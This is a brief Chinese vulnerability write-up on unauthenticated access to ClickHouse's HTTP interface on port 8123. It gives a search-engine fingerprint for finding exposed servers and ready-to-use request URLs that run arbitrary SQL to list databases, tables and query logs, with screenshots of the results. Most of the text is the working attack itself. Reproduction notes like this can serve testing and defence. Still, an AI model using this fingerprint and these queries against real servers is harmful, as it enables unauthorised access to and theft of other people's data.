# ClickHouse API 数据库接口未授权访问漏洞

## 漏洞描述

ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据

## 漏洞影响

```
ClickHouse
```

## 网络测绘

```
"ClickHouse" && body="ok"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326122352318.png)

执行SQL语句

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326122352319.png)

```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical
```

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326122352320.png)

其他的SQL语句：

```
http://your-ip:8123/?query=SHOW%20DATABASES
```

```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.tables
```

